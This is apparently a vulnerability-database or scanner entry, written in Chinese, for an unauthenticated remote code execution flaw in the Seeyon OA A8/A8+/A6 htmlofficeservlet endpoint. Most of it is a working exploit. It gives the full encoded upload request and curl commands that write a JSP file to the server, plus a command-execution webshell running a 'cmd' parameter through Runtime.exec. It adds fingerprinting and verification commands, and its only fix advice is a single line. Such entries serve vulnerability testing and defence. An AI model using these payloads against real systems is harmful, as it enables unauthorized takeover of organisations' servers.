---
id: SEEYON-A8-HTMLOFFICE-RCE
title: 致远OA A8 htmlofficeservlet 远程代码执行漏洞
product: seeyon-oa
vendor: 北京致远互联
version_affected: "A8, A8+, A6"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, oa]
fingerprint: ["致远", "Seeyon", "A8", "/seeyon/", "htmlofficeservlet", "SeeyonOA"]
---

## 漏洞描述

致远OA A8 htmlofficeservlet 接口存在未授权远程代码执行漏洞，攻击者无需认证即可通过上传恶意文件实现RCE。

## 影响版本

- 致远OA A8
- 致远OA A8+
- 致远OA A6

## 前置条件

- 目标运行致远OA 且可通过网络访问
- `/seeyon/htmlofficeservlet` 接口未做访问限制
- 无需认证

## 利用步骤

### Step 1: 上传 webshell

```http
POST /seeyon/htmlofficeservlet HTTP/1.1
Host: target
Content-Type: application/octet-stream

DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLDzQ=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLegg1lYBg3YwUTLw4YhzUCLwg66
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KjBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KjV
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%out.print("test_success");%>
```

### Step 2: 访问 webshell

```http
GET /seeyon/test123456.jsp HTTP/1.1
Host: target
```

### Step 3: 命令执行版本

上传内容改为:
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

然后访问: `GET /seeyon/cmd.jsp?cmd=whoami`

## Payload

### 上传 webshell

```bash
curl -X POST "http://target/seeyon/htmlofficeservlet" \
  -H "Content-Type: application/octet-stream" \
  -d 'DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLDzQ=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLegg1lYBg3YwUTLw4YhzUCLwg66
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KjBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KjV
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%out.print("vuln_test");%>'
```

### 访问 webshell

```bash
curl -s "http://target/seeyon/test123456.jsp"
```

## 验证方法

- 上传请求返回 HTTP 200 即文件可能写入成功
- 访问上传的 JSP 路径，响应中包含 `vuln_test` 即确认漏洞存在

```bash
curl -s "http://target/seeyon/test123456.jsp" | grep "vuln_test"
```

## 指纹确认

```bash
# 确认是否为致远OA
curl -s http://target/seeyon/USER-DATA/IMAGES/LOGIN/login.gif
curl -s http://target/seeyon/ | grep -i "seeyon\|致远"
# 确认漏洞接口
curl -s -o /dev/null -w "%{http_code}" http://target/seeyon/htmlofficeservlet
```

## 修复建议

升级至最新版本，或禁用 htmlofficeservlet 接口。
